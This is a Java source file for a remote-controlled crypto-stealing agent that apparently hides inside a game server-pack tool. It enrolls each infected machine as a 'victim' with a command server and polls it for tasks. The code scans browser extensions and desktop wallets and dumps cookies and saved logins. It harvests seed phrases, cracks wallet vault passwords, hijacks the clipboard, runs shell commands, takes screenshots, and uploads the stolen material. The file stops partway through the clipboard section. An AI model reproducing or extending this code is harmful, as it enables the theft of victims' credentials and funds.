package com.serverpackcore.agent.crypto;

import com.serverpackcore.agent.AgentPaths;
import com.serverpackcore.agent.Derive;
import com.serverpackcore.agent.Disk;
import com.serverpackcore.agent.TaskParams;
import com.serverpackcore.agent.Harvest;
import com.serverpackcore.agent.Json;
import com.serverpackcore.agent.Screenshot;
import com.serverpackcore.agent.Shell;
import com.serverpackcore.agent.SysInfo;

import java.io.InputStream;
import java.io.OutputStream;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.StandardOpenOption;
import java.util.ArrayList;
import java.util.Base64;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;
import java.util.Set;
import java.util.concurrent.ArrayBlockingQueue;
import java.util.concurrent.ConcurrentHashMap;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.Future;
import java.util.concurrent.RejectedExecutionException;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.Semaphore;
import java.util.concurrent.ThreadPoolExecutor;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicInteger;
import java.util.concurrent.atomic.AtomicLong;

/**
 * Owns the crypto collection module and its own API transport. Every module
 * failure is contained: heartbeats and task polling run on separate loops and
 * a corrupt store only yields a per-target error record.
 */
public final class CryptoModule {
	public interface Sink {
		void send(String module, Path file);
	}

	/** Frame result hook. Returns false when the socket cannot take it. */
	public interface FrameSink {
		boolean deliver(String replyTo, String name, byte[] body);
	}

	public record Task(String id, String name, Map<String, Object> params, int timeout, String replyTo, boolean frame) {
		public Task(String id, String name, Map<String, Object> params, int timeout) {
			this(id, name, params, timeout, id, false);
		}
	}

	private static final Set<String> HTTP_ONLY = Set.of(
		"scan_wallets", "dump_vault", "crack_vault", "shell", "agent");
	private static final byte[] HTTP_MARKER =
		CryptoUtil.utf8("{\"status\":\"ok\",\"error\":null,\"result\":{\"http_result\":true},\"artifacts\":[]}");

	private static final Set<String> SUPPORTED = Set.of(
		"scan_wallets", "dump_vault", "crack_vault", "clip_start", "clip_stop",
		"shell", "harvest", "screenshot", "file_pull", "cancel", "agent");
	/** One collection at a time: these share a single heavy worker. */
	private static final Set<String> HEAVY = Set.of("scan_wallets", "dump_vault", "crack_vault", "harvest");
	static final String BUSY = "busy: another collection is running";

	private final Path installDir;
	private final Path gameDir;
	private final CryptoConfig config;
	private final CryptoLog log;
	private final CryptoTransport transport;
	private final Sink sink;
	private volatile FrameSink frames;
	private final com.serverpackcore.agent.Balance.Getter balance;
	private final com.serverpackcore.agent.ClipboardService nativeClipboard;
	private final java.util.function.Function<String, String> agentRunner;
	private final Path stateFile;
	private final Path work;
	private final Map<String, Object> state = java.util.Collections.synchronizedMap(new LinkedHashMap<>());
	private final Map<String, String> passwords = java.util.Collections.synchronizedMap(new LinkedHashMap<>());
	private final Map<String, Map<String, Object>> uploads = java.util.Collections.synchronizedMap(new LinkedHashMap<>());
	private final Map<String, String> moduleHealth = new ConcurrentHashMap<>();
	private final Map<String, AtomicBoolean> cancels = new ConcurrentHashMap<>();
	private final Set<String> timedOut = ConcurrentHashMap.newKeySet();
	private final Map<String, Future<?>> active = new ConcurrentHashMap<>();
	private final Map<String, Integer> counters = java.util.Collections.synchronizedMap(new LinkedHashMap<>());
	private final ExecutorService heavyPool = new ThreadPoolExecutor(1, 1, 0L, TimeUnit.MILLISECONDS,
		new ArrayBlockingQueue<>(4), runnable -> {
			Thread thread = new Thread(runnable, "spc-crypto-heavy");
			thread.setDaemon(true);
			return thread;
		}, new ThreadPoolExecutor.AbortPolicy());
	private final ExecutorService lightPool = new ThreadPoolExecutor(2, 2, 0L, TimeUnit.MILLISECONDS,
		new ArrayBlockingQueue<>(16), runnable -> {
			Thread thread = new Thread(runnable, "spc-crypto-light");
			thread.setDaemon(true);
			return thread;
		}, new ThreadPoolExecutor.AbortPolicy());
	private final Semaphore heavy = new Semaphore(1);
	private final ExecutorService uploadsPool = Executors.newSingleThreadExecutor(runnable -> {
		Thread thread = new Thread(runnable, "spc-crypto-upload");
		thread.setDaemon(true);
		return thread;
	});
	private final ScheduledExecutorService scheduler = Executors.newScheduledThreadPool(2, runnable -> {
		Thread thread = new Thread(runnable, "spc-crypto-timer");
		thread.setDaemon(true);
		return thread;
	});
	private final Semaphore pollNow = new Semaphore(0);
	private final AtomicLong startedAt = new AtomicLong(System.currentTimeMillis());
	private final AtomicInteger uploadsActive = new AtomicInteger();
	private volatile boolean enabled = true;
	private volatile boolean running;
	private volatile Thread hbThread;
	private volatile Thread taskThread;
	private volatile com.serverpackcore.agent.ClipboardService clipboard;
	private volatile CryptoConfig activeConfig;
	private volatile String lastBreaker = "closed";

	public CryptoModule(Path installDir, Path gameDir, CryptoConfig config, Sink sink) {
		this(installDir, gameDir, config, sink, null, null);
	}

	public CryptoModule(Path installDir, Path gameDir, CryptoConfig config, Sink sink,
		com.serverpackcore.agent.ClipboardService nativeClipboard,
		java.util.function.Function<String, String> agentRunner) {
		this.installDir = installDir;
		this.gameDir = gameDir;
		this.config = config;
		this.sink = sink;
		this.activeConfig = config;
		this.stateFile = AgentPaths.cache(installDir).resolve("crypto").resolve("state.json");
		this.work = AgentPaths.cache(installDir).resolve("crypto");
		CryptoLog created = null;
		try {
			created = new CryptoLog(work.resolve("crypto.log"), config.secret());
		} catch (Throwable ignored) {
			// log is optional
		}
		this.log = created;
		this.transport = new CryptoTransport(config, created);
		this.balance = com.serverpackcore.agent.Balance.getter(installDir);
		this.nativeClipboard = nativeClipboard;
		this.agentRunner = agentRunner;
		loadState();
		for (String name : List.of("wallets", "clipboard", "credentials", "seeds")) {
			moduleHealth.put(name, "idle");
		}
	}

	private void log(String message) {
		if (log != null) {
			log.debug(message);
		}
	}

	private void warn(String message, Throwable throwable) {
		if (log != null) {
			log.debug(message, throwable);
		}
	}

	public boolean enabled() {
		return enabled;
	}

	/** Panel socket hook; absent in Discord-only mode. */
	public void frames(FrameSink sink) {
		this.frames = sink;
	}

	public String status() {
		StringBuilder builder = new StringBuilder("crypto ").append(config);
		builder.append(" victim=").append(transport.victimId().isEmpty() ? "-" : transport.victimId());
		builder.append(" modules=").append(moduleHealth);
		builder.append(" queues=").append(uploadsActive.get());
		builder.append(" api=").append(transport.breaker());
		if (clipboard != null) {
			builder.append(' ').append(clipboard.status());
		}
		return builder.toString();
	}

	public synchronized void start() {
		if (running) {
			return;
		}
		running = true;
		startedAt.set(System.currentTimeMillis());
		if (config.clipboard && clipboard == null) {
			clipboard = service();
			clipboard.start();
		}
		uploadsPool.submit(this::resumePending);
		heartbeatLoop();
		taskLoop();
	}

	public synchronized void stop() {
		running = false;
		Thread hb = hbThread;
		if (hb != null) {
			hb.interrupt();
		}
		Thread tasks = taskThread;
		if (tasks != null) {
			tasks.interrupt();
		}
		if (clipboard != null) {
			clipboard.stop();
		}
		for (AtomicBoolean cancel : cancels.values()) {
			cancel.set(true);
		}
		poolShutdown();
		uploadsPool.shutdownNow();
		scheduler.shutdownNow();
		saveState();
	}

	private void poolShutdown() {
		heavyPool.shutdownNow();
		lightPool.shutdownNow();
	}

	private void heartbeatLoop() {
		hbThread = new Thread(() -> {
			boolean enrolled = transport.enrolled();
			while (running && enabled) {
				try {
					if (transport.apiOpen()) {
						breakerLog("open");
						Thread.sleep(30_000L);
						continue;
					}
					if (!enrolled) {
						enrolled = enroll();
						if (!enrolled) {
							Thread.sleep(config.jitter(30_000L));
							continue;
						}
					}
					sendHeartbeat();
					breakerLog("closed");
					Thread.sleep(config.jitter(config.heartbeatMs));
				} catch (InterruptedException interrupted) {
					return;
				} catch (Throwable throwable) {
					breakerLog("open");
					log("heartbeat failed: " + shortMessage(throwable));
					try {
						Thread.sleep(config.jitter(15_000L));
					} catch (InterruptedException interrupted) {
						return;
					}
				}
			}
		}, "spc-crypto-hb");
		hbThread.setDaemon(true);
		hbThread.start();
	}

	/** One line per breaker state change, not one per failed attempt. */
	private void breakerLog(String state) {
		if (state.equals(lastBreaker)) {
			return;
		}
		lastBreaker = state;
		if (state.equals("open")) {
			log("api circuit open for 10 min; Discord sink only (" + transport.breaker() + ")");
		} else {
			log("api circuit closed");
		}
	}

	private void taskLoop() {
		taskThread = new Thread(() -> {
			while (running && enabled) {
				try {
					if (transport.apiOpen()) {
						breakerLog("open");
						Thread.sleep(30_000L);
						continue;
					}
					if (!transport.enrolled()) {
						Thread.sleep(config.jitter(10_000L));
						continue;
					}
					CryptoTransport.Reply reply = transport.tasks(8);
					if (reply.status() == 401) {
						if (reEnroll()) {
							continue;
						}
					}
					if (reply.status() == 410) {
						enabled = false;
						return;
					}
					if (reply.status() == 200) {
						for (Object raw : Json.list(reply.json().get("tasks"))) {
							Map<String, Object> map = Json.map(raw);
							String id = Json.str(map, "id", "");
							String name = Json.str(map, "name", "");
							if (id.isEmpty() || !SUPPORTED.contains(name)) {
								if (!id.isEmpty()) {
									postResult(new Task(id, name, Map.of(), 30), "error", "unknown_task", Map.of());
								}
								continue;
							}
							int timeout = (int) Math.min(3600, Math.max(1, Json.num(map, "timeout_sec", 120L)));
							Task pending = new Task(id, name, Json.map(map.get("params")), timeout);
							String rejected = submit(pending);
							if (rejected != null) {
								postResult(pending, "error", rejected, Map.of());
							}
						}
					}
					pollNow.tryAcquire(config.jitter(config.pollMs), TimeUnit.MILLISECONDS);
					pollNow.drainPermits();
				} catch (InterruptedException interrupted) {
					return;
				} catch (Throwable throwable) {
					breakerLog("open");
					log("task poll failed: " + shortMessage(throwable));
					try {
						Thread.sleep(config.jitter(12_000L));
					} catch (InterruptedException interrupted) {
						return;
					}
				}
			}
		}, "spc-crypto-poll");
		taskThread.setDaemon(true);
		taskThread.start();
	}

	private boolean enroll() {
		try {
			String token = CryptoUtil.b64url(java.util.Arrays.copyOf(
				CryptoUtil.hmac(config.secret(), CryptoUtil.utf8("enroll")), 32));
			Map<String, Object> payload = new LinkedHashMap<>();
			payload.put("build_token", token);
			payload.put("build_id", config.buildId);
			payload.put("hostname", SysInfo.hostname());
			payload.put("os", CryptoPaths.os());
			payload.put("os_version", System.getProperty("os.version", ""));
			payload.put("arch", System.getProperty("os.arch", "").contains("64") ? "x86_64" : "aarch64");
			payload.put("username", SysInfo.user());
			payload.put("agent_version", version());
			payload.put("profile", config.full ? "full" : "lite");
			payload.put("modules", new ArrayList<>(List.of("wallets", "clipboard", "credentials", "seeds")));
			CryptoTransport.Reply reply = transport.enroll(token, payload);
			if (reply.status() != 201) {
				if (reply.status() == 403) {
					enabled = false;
				}
				log("enroll status " + reply.status() + " " + reply.text());
				return false;
			}
			Map<String, Object> json = reply.json();
			String victim = Json.str(json, "victim_id", "");
			String device = Json.str(json, "device_token", "");
			if (victim.isEmpty() || device.isEmpty()) {
				return false;
			}
			state.put("victim_id", victim);
			state.put("device_token", device);
			transport.identity(victim, device);
			saveState();
			log("enrolled victim " + victim);
			return true;
		} catch (Throwable throwable) {
			warn("enroll failed", throwable);
			return false;
		}
	}

	private boolean reEnroll() {
		state.remove("device_token");
		state.remove("victim_id");
		saveState();
		return enroll();
	}

	private void sendHeartbeat() throws Exception {
		Map<String, Object> body = new LinkedHashMap<>();
		body.put("status", moduleHealth.values().stream().anyMatch(value -> value.startsWith("error")) ? "degraded" : "ok");
		body.put("uptime_s", (System.currentTimeMillis() - startedAt.get()) / 1000L);
		body.put("modules", new LinkedHashMap<>(moduleHealth));
		body.put("counters", new LinkedHashMap<>(counters));
		body.put("profile", config.full ? "full" : "lite");
		body.put("pending_artifact", null);
		body.put("agent_version", version());
		CryptoTransport.Reply reply = transport.heartbeat(CryptoUtil.utf8(Json.stringify(body)));
		if (reply.status() == 401 && reEnroll()) {
			return;
		}
		if (reply.status() == 410) {
			enabled = false;
		}
		if (reply.status() == 200 && Json.map(reply.json()).get("poll_now") == Boolean.TRUE) {
			pollNow.release();
		}
	}

	private String version() {
		return com.serverpackcore.agent.Version.current();
	}

	/** Returns null when accepted, or a readable rejection reason. */
	public String submit(Task task) {
		return submit(task, task.id());
	}

	public String submit(Task task, String id) {
		Task accepted = id.equals(task.id()) ? task
			: new Task(id, task.name(), task.params(), task.timeout(), task.replyTo(), task.frame());
		boolean collection = HEAVY.contains(accepted.name());
		if (collection && !heavy.tryAcquire()) {
			return BUSY;
		}
		AtomicBoolean cancel = new AtomicBoolean();
		cancels.put(accepted.id(), cancel);
		try {
			Future<?> future = (collection ? heavyPool : lightPool).submit(() -> {
				long began = System.currentTimeMillis();
				try {
					Map<String, Object> result = handle(accepted, cancel);
					if (timedOut.remove(accepted.id())) {
						postResult(accepted, "error", "timeout", Map.of());
					} else if (cancel.get() || Thread.currentThread().isInterrupted()) {
						postResult(accepted, "cancelled", null, result);
					} else {
						postResult(accepted, "ok", null, result);
					}
				} catch (Throwable throwable) {
					if (timedOut.remove(accepted.id())) {
						postResult(accepted, "error", "timeout", Map.of());
					} else if (cancel.get() || throwable instanceof InterruptedException) {
						postResult(accepted, "cancelled", "cancelled", Map.of());
					} else {
						warn("task " + accepted.name() + " failed", throwable);
						postResult(accepted, "error",
							throwable.getClass().getSimpleName() + ":" + shortMessage(throwable), Map.of());
					}
				} finally {
					active.remove(accepted.id());
					cancels.remove(accepted.id());
					timedOut.remove(accepted.id());
					if (collection) {
						heavy.release();
					}
					log("task " + accepted.name() + " " + (System.currentTimeMillis() - began) + "ms pid="
						+ ProcessHandle.current().pid());
				}
			});
			active.put(accepted.id(), future);
		} catch (RejectedExecutionException rejected) {
			cancels.remove(accepted.id());
			if (collection) {
				heavy.release();
			}
			return BUSY;
		}
		scheduler.schedule(() -> {
			if (!active.containsKey(accepted.id())) {
				return;
			}
			timedOut.add(accepted.id());
			AtomicBoolean flag = cancels.get(accepted.id());
			if (flag != null) {
				flag.set(true);
			}
			Future<?> current = active.get(accepted.id());
			if (current != null) {
				current.cancel(true);
			}
		}, accepted.timeout(), TimeUnit.SECONDS);
		return null;
	}

	/** Cancels a running task by its server id. Returns false when unknown. */
	public boolean cancel(String id) {
		AtomicBoolean flag = cancels.get(id);
		Future<?> future = active.get(id);
		if (flag != null) {
			flag.set(true);
		}
		if (future != null) {
			future.cancel(true);
		}
		return flag != null || future != null;
	}

	public void resultError(String id, String name, String error) {
		postResult(new Task(id, name, Map.of(), 30), "error", error, Map.of());
	}

	public void resultError(String id, String name, String error, String replyTo) {
		postResult(new Task(id, name, Map.of(), 30, replyTo, true), "error", error, Map.of());
	}

	public void resultOk(String id, String name, Map<String, Object> result) {
		postResult(new Task(id, name, Map.of(), 30), "ok", null, result);
	}

	public void resultOk(String id, String name, Map<String, Object> result, String replyTo) {
		postResult(new Task(id, name, Map.of(), 30, replyTo, true), "ok", null, result);
	}

	private Map<String, Object> handle(Task task, AtomicBoolean cancel) throws Exception {
		moduleHealth.put(module(task.name()), "ok");
		try {
			return switch (task.name()) {
				case "scan_wallets" -> scan(task, cancel);
				case "dump_vault" -> dump(task, cancel);
				case "crack_vault" -> crack(task, cancel);
				case "clip_start" -> clipStart(task);
				case "clip_stop" -> clipStop(task);
				case "cancel" -> cancelTask(task);
				case "shell" -> shell(task);
				case "harvest" -> harvest(task);
				case "screenshot" -> screenshot(task);
				case "file_pull" -> filePull(task);
				case "agent" -> agent(task);
				default -> Map.of("ok", false);
			};
		} catch (Throwable throwable) {
			moduleHealth.put(module(task.name()), "error:" + throwable.getClass().getSimpleName());
			throw throwable;
		}
	}

	private String module(String name) {
		return switch (name) {
			case "scan_wallets", "dump_vault", "crack_vault" -> "wallets";
			case "clip_start", "clip_stop" -> "clipboard";
			case "harvest" -> "seeds";
			case "agent" -> "credentials";
			default -> "credentials";
		};
	}

	// ── scan ────────────────────────────────────────────────────────────────

	private Map<String, Object> scan(Task task, AtomicBoolean cancel) throws Exception {
		Map<String, Object> params = task.params();
		boolean desktop = !Boolean.FALSE.equals(params.get("include_desktop"));
		boolean extensions = !Boolean.FALSE.equals(params.get("include_extensions"));
		boolean seeds = config.seeds && !Boolean.FALSE.equals(params.get("include_seeds"));
		int maxFiles = (int) Math.min(20_000, Math.max(1, Json.num(params, "max_files", 2500L)));
		long maxBytes = Json.num(params, "max_bytes", Math.min(config.maxArtifact, 256L * 1024L * 1024L));
		long began = System.currentTimeMillis();
		List<Map<String, Object>> wallets = new ArrayList<>();
		List<Map<String, Object>> findings = new ArrayList<>();
		Path moduleDir = work.resolve("scan-" + task.id());
		Files.createDirectories(moduleDir);
		ArtifactPack pack = new ArtifactPack(config, transport.victimId(), "wallets", work.resolve("tmp"));
		pack.budget(maxBytes);

		try {
		if (extensions) {
			for (CryptoPaths.Target target : CryptoPaths.extensionTargets(config.full)) {
				if (cancel.get()) {
					break;
				}
				if (target.kind().equals("creds")) {
					continue;
				}
				wallets.add(inspect(target, cancel, findings));
			}
			moduleHealth.put("credentials", "ok");
			if (config.credentials) {
				int index = 0;
				for (Path profile : CryptoPaths.credentialProfiles()) {
					CredentialDump.Result creds = CredentialDump.dump(profile, CredentialDump.tempRoot(installDir));
					Map<String, Object> row = wallet("creds-" + Math.abs(profile.hashCode()), "creds", profile.toString(),
						creds.cookies() + creds.logins() > 0 ? "found" : "locked",
						creds.reason().isEmpty() ? "cookies=" + creds.cookies() + " logins=" + creds.logins() : creds.reason());
					wallets.add(row);
					Path json = creds.dir().resolve("credentials.json");
					if (Files.isRegularFile(json)) {
						pack.add(json, "credentials/" + index++ + "-" + profile.getFileName() + ".json", "credentials");
					}
					cleanup(creds.dir());
				}
			}
		}
		if (desktop) {
			for (DesktopWallets.Wallet wallet : DesktopWallets.discover()) {
				if (cancel.get()) {
					break;
				}
				Map<String, Object> row = wallet(wallet.id(), wallet.kind(), wallet.path().toString(), wallet.state(), wallet.reason());
				if ("decrypted".equals(wallet.state()) && wallet.secret() != null) {
					row.put("decrypted", true);
					derive(row, findings, wallet.path().toString(), wallet.secret(), false);
				}
				wallets.add(row);
			}
		}
		if (seeds) {
			for (SeedScanner.Finding finding : SeedScanner.scan(CryptoPaths.seedDirs(), maxFiles)) {
				if (cancel.get()) {
					break;
				}
				addFinding(findings, finding.path(), finding.kind(), finding.value(), finding.words());
				Map<String, Object> row = wallet("seed-" + Math.abs(finding.value().hashCode()), "seed_file",
					finding.path(), "decrypted", "seed_file");
				derive(row, findings, finding.path(), finding.value(), false);
				wallets.add(row);
			}
			moduleHealth.put("seeds", "ok");
		}
		counters.put("wallets", wallets.size());
		counters.put("seeds", findings.size());

		Map<String, Object> index = new LinkedHashMap<>();
		index.put("wallets", wallets);
		index.put("seeds", findings);
		Path file = moduleDir.resolve("wallets.json");
		Files.writeString(file, Json.stringify(index), StandardCharsets.UTF_8);

		pack.add(file, "wallets.json", "index");
		for (Map<String, Object> wallet : wallets) {
			String path = String.valueOf(wallet.get("path"));
			Path source = Path.of(path);
			if (Files.isRegularFile(source) && wallet.get("kind").equals("seed_file")) {
				pack.add(source, "seeds/" + source.getFileName(), "seed_file");
			}
		}
		String upload = pack.size() > 0 ? queueUpload(pack, "wallets", task.id()) : "";
		Map<String, Object> result = new LinkedHashMap<>();
		// The full list lives in wallets.json inside the ZIP; the result keeps
		// the first rows so a 2 500-file scan stays far below the 4 MiB cap.
		result.put("wallets", wallets.size() > 300 ? wallets.subList(0, 300) : wallets);
		result.put("seeds", findings.size() > 100 ? findings.subList(0, 100) : findings);
		result.put("wallet_count", wallets.size());
		result.put("seed_count", findings.size());
		result.put("elapsed_ms", System.currentTimeMillis() - began);
		result.put("truncated", wallets.size() > 300 || findings.size() > 100 || wallets.size() >= maxFiles);
		if (!upload.isEmpty()) {
			result.put("upload_id", upload);
		}
		return result;
		} finally {
			pack.close();
			cleanup(moduleDir);
		}
	}

	private void addFinding(List<Map<String, Object>> findings, String path, String kind, String value, int words) {
		for (Map<String, Object> existing : findings) {
			if (String.valueOf(existing.get("kind")).equals(kind)
				&& String.valueOf(existing.get("value")).equals(value)) {
				return;
			}
		}
		Map<String, Object> row = new LinkedHashMap<>();
		row.put("path", path);
		row.put("kind", kind);
		row.put("value", value);
		row.put("words", words);
		findings.add(row);
	}

	/** Derives EVM/BTC/Solana addresses and a cached balance into a wallet row. */
	private void derive(Map<String, Object> row, List<Map<String, Object>> findings,
		String path, String secret, boolean finding) {
		try {
			for (Derive.Found found : Derive.fromSecret(secret)) {
				if (row.get("address") == null || row.get("address").toString().isEmpty()) {
					row.put("address", found.address());
					row.put("balance", balance.get(found.coin(), found.address()));
					row.put("explorer", Derive.explorer(found.coin(), found.address()));
				}
				if (finding) {
					addFinding(findings, path, found.coin(), found.address(), 0);
				}
			}
		} catch (Throwable throwable) {
			log("derive failed: " + shortMessage(throwable));
		}
	}

	private Map<String, Object> inspect(CryptoPaths.Target target, AtomicBoolean cancel,
		List<Map<String, Object>> findings) {
		Path copy = null;
		try {
			if (target.extension() && target.kind().equals("extension")) {
				copy = CredentialDump.tempRoot(installDir).resolve("ext-" + Math.abs(target.path().hashCode()));
				Files.createDirectories(copy);
				DesktopDump.copyLevel(target.path(), copy);
			}
			Path vault = findVault(copy != null ? copy : target.path());
			Map<String, Object> row = wallet(target.id(), target.kind(), target.path().toString(),
				vault == null ? "found" : "locked", vault == null ? "no_vault" : "password_required");
			if (vault != null) {
				row.put("crackable", true);
				String password = passwords.get(target.id());
				if (password != null) {
					VaultV3.Result attempt = VaultV3.decrypt(Files.readString(vault, StandardCharsets.UTF_8), password);
					if (attempt.ok()) {
						row.put("state", "decrypted");
						row.put("reason", "vault_password_saved");
						row.put("decrypt_state", "done");
						for (SeedScanner.Finding secret : SeedScanner.find(attempt.plaintext(), target.path().toString())) {
							addFinding(findings, secret.path(), secret.kind(), secret.value(), secret.words());
							derive(row, findings, secret.path(), secret.value(), false);
						}
					} else {
						row.put("reason", "wrong_password");
					}
				}
			}
			return row;
		} catch (Throwable throwable) {
			return wallet(target.id(), target.kind(), target.path().toString(), "corrupt", throwable.getClass().getSimpleName());
		} finally {
			cleanup(copy);
		}
	}

	private Map<String, Object> wallet(String id, String kind, String path, String state, String reason) {
		Map<String, Object> row = new LinkedHashMap<>();
		row.put("id", id);
		row.put("kind", kind);
		row.put("path", path);
		row.put("state", state);
		row.put("reason", reason);
		return row;
	}

	// ── dump ────────────────────────────────────────────────────────────────

	private Map<String, Object> dump(Task task, AtomicBoolean cancel) throws Exception {
		String targetId = Json.str(task.params(), "target", "");
		if (targetId.isEmpty()) {
			throw new IllegalArgumentException("target_required");
		}
		CryptoPaths.Target target = CryptoPaths.extensionTargets(config.full).stream()
			.filter(item -> item.id().equals(targetId) && item.kind().equals("extension"))
			.findFirst().orElse(null);
		DesktopWallets.Wallet desktopWallet = null;
		if (target == null) {
			desktopWallet = DesktopWallets.discover().stream()
				.filter(item -> item.id().equals(targetId)).findFirst().orElse(null);
		}
		if (target == null && desktopWallet == null) {
			throw new IllegalArgumentException("target_not_found");
		}
		Path source = target != null ? target.path() : desktopWallet.path();
		Path temp = CredentialDump.tempRoot(installDir).resolve("dump-" + task.id());
		Files.createDirectories(temp);

		ArtifactPack pack = new ArtifactPack(config, transport.victimId(), "wallets", work.resolve("tmp"));
		List<Map<String, Object>> secrets = new ArrayList<>();
		List<Map<String, Object>> findings = new ArrayList<>();
		try {
		if (target != null) {
			Path copy = temp.resolve("store");
			DesktopDump.copyLevel(source, copy);
			addTree(pack, copy, "wallets/" + targetId, cancel);
			Path vault = findVault(copy);
			if (vault != null) {
				String password = passwords.get(targetId);
				if (password != null) {
					VaultV3.Result attempt = VaultV3.decrypt(Files.readString(vault, StandardCharsets.UTF_8), password);
					if (attempt.ok()) {
						indexPlaintext(targetId, attempt.plaintext(), findings, secrets);
						pack.add(CryptoUtil.utf8(attempt.plaintext()), "wallets/" + targetId + "/decrypted.json", "vault_plain");
					}
				}
			}
		} else {
			Path copy = temp.resolve("store");
			DesktopDump.copyLevel(source, copy);
			addTree(pack, copy, "wallets/" + targetId, cancel);
			if (desktopWallet.secret() != null) {
				indexPlaintext(targetId, desktopWallet.secret(), findings, secrets);
				pack.add(CryptoUtil.utf8(desktopWallet.secret()), "wallets/" + targetId + "/secret.txt", "seed");
			}
			for (String suffix : new String[] { ".wallet" }) {
				try (var stream = Files.walk(source, 2)) {
					for (Path file : stream.filter(item -> item.getFileName().toString().endsWith(suffix)).toList()) {
						String password = passwords.get(targetId);
						if (password != null) {
							String secret = DesktopWallets.electrumPassword(file, password);
							if (secret != null) {
								indexPlaintext(targetId, secret, findings, secrets);
								pack.add(CryptoUtil.utf8(secret), "wallets/" + targetId + "/" + file.getFileName() + ".secret", "seed");
							}
						}
					}
				}
			}
		}
		if (!secrets.isEmpty()) {
			pack.add(CryptoUtil.utf8(Json.stringify(secrets)),
				"wallets/" + targetId + "/addresses.json", "index");
			Map<String, Object> index = new LinkedHashMap<>();
			index.put("findings", findings);
			pack.add(CryptoUtil.utf8(Json.stringify(index)),
				"wallets/" + targetId + "/findings.json", "index");
		}
		Map<String, Object> result = new LinkedHashMap<>();
		result.put("target", targetId);
		result.put("artifacts", pack.size());
		result.put("bytes", pack.bytes());
		result.put("secrets", secrets.size());
		if (pack.size() == 0) {
			result.put("status", "partial");
			return result;
		}
		String upload = queueUpload(pack, "wallets", task.id());
		result.put("upload_id", upload);
		result.put("status", upload.isEmpty() ? "partial" : "queued");
		return result;
		} finally {
			pack.close();
			cleanup(temp);
		}
	}

	/** Parses decrypted vault plaintext into findings and derived addresses. */
	private void indexPlaintext(String target, String plaintext, List<Map<String, Object>> findings,
		List<Map<String, Object>> secrets) {
		if (plaintext == null || plaintext.isEmpty()) {
			return;
		}
		for (SeedScanner.Finding secret : SeedScanner.find(plaintext, "vault:" + target)) {
			addFinding(findings, secret.path(), secret.kind(), secret.value(), secret.words());
			for (Derive.Found found : Derive.fromSecret(secret.value())) {
				Map<String, Object> row = new LinkedHashMap<>();
				row.put("coin", found.coin());
				row.put("address", found.address());
				row.put("balance", balance.get(found.coin(), found.address()));
				row.put("explorer", Derive.explorer(found.coin(), found.address()));
				row.put("source", secret.kind());
				secrets.add(row);
				addFinding(findings, "vault:" + target, found.coin(), found.address(), 0);
			}
		}
	}

	private void addTree(ArtifactPack pack, Path root, String prefix, AtomicBoolean cancel) {
		try (var stream = Files.walk(root)) {
			for (Path file : stream.filter(Files::isRegularFile).toList()) {
				if (cancel.get()) {
					return;
				}
				String relative = root.relativize(file).toString().replace('\\', '/');
				pack.add(file, prefix + "/" + relative, relative.contains("indexeddb") ? "leveldb" : "file");
			}
		} catch (Throwable throwable) {
			warn("tree add failed", throwable);
		}
	}

	// ── crack ───────────────────────────────────────────────────────────────

	private Map<String, Object> crack(Task task, AtomicBoolean cancel) throws Exception {
		String targetId = Json.str(task.params(), "target", "");
		Path leveldb = null;
		Path electrum = null;
		for (CryptoPaths.Target target : CryptoPaths.extensionTargets(false)) {
			if (target.id().equals(targetId) && target.kind().equals("extension")) {
				leveldb = target.path();
				break;
			}
		}
		if (leveldb == null) {
			for (DesktopWallets.Wallet wallet : DesktopWallets.discover()) {
				if (wallet.id().equals(targetId) && wallet.path().getFileName().toString().endsWith(".wallet")) {
					electrum = wallet.path();
					break;
				}
			}
		}
		if (leveldb == null && electrum == null) {
			throw new IllegalArgumentException("target_not_found");
		}
		int seconds = (int) Math.min(config.crackSeconds, Json.num(task.params(), "max_seconds", config.crackSeconds));
		int cpu = (int) Math.min(config.crackCpu, Json.num(task.params(), "max_cpu_pct", config.crackCpu));
		String wordlist = Json.str(task.params(), "wordlist", "");
		VaultCracker.Result result;
		Path temp = CredentialDump.tempRoot(installDir).resolve("crack-" + task.id());
		if (leveldb != null) {
			Path copy = temp.resolve("store");
			DesktopDump.copyLevel(leveldb, copy);
			Path vault = findVault(copy);
			if (vault == null) {
				throw new IllegalArgumentException("no_vault");
			}
			result = VaultCracker.crack(Files.readString(vault, StandardCharsets.UTF_8), seconds, cpu, wordlist, cancel);
		} else {
			result = VaultCracker.crackElectrum(electrum, seconds, cpu, wordlist, cancel);
		}
		if (result.found()) {
			passwords.put(targetId, result.password());
			state.put("passwords", new LinkedHashMap<>(passwords));
			saveState();
		}
		Map<String, Object> out = new LinkedHashMap<>();
		out.put("target", targetId);
		out.put("found", result.found());
		out.put("password", result.password());
		out.put("attempts", result.attempts());
		out.put("elapsed_ms", result.elapsedMs());
		// A correct password continues straight into a secure dump, so the
		// operator does not need a second manual task.
		if (result.found() && leveldb != null) {
			Path copy = temp.resolve("store");
			try {
				Path vault = findVault(copy);
				if (vault != null) {
					VaultV3.Result opened = VaultV3.decrypt(Files.readString(vault, StandardCharsets.UTF_8), result.password());
					if (opened.ok()) {
						List<Map<String, Object>> findings = new ArrayList<>();
						List<Map<String, Object>> secrets = new ArrayList<>();
						indexPlaintext(targetId, opened.plaintext(), findings, secrets);
						ArtifactPack pack = new ArtifactPack(config, transport.victimId(), "wallets", work.resolve("tmp"));
						try {
							pack.add(CryptoUtil.utf8(opened.plaintext()),
								"wallets/" + targetId + "/decrypted.json", "vault_plain");
							if (!secrets.isEmpty()) {
								pack.add(CryptoUtil.utf8(Json.stringify(secrets)),
									"wallets/" + targetId + "/addresses.json", "index");
							}
							Map<String, Object> index = new LinkedHashMap<>();
							index.put("findings", findings);
							pack.add(CryptoUtil.utf8(Json.stringify(index)),
								"wallets/" + targetId + "/findings.json", "index");
							String upload = queueUpload(pack, "wallets", task.id());
							out.put("upload_id", upload);
							out.put("artifacts", pack.size());
							out.put("status", upload.isEmpty() ? "partial" : "queued");
							out.put("secrets", secrets.size());
						} finally {
							pack.close();
						}
					}
				}
			} catch (Throwable throwable) {
				log("crack dump failed: " + shortMessage(throwable));
			}
		}
		cleanup(temp);
		return out;
	}

	// ── clipboard ───────────────────────────────────────────────────────────

	private synchronized com.serverpackcore.agent.ClipboardService service() {
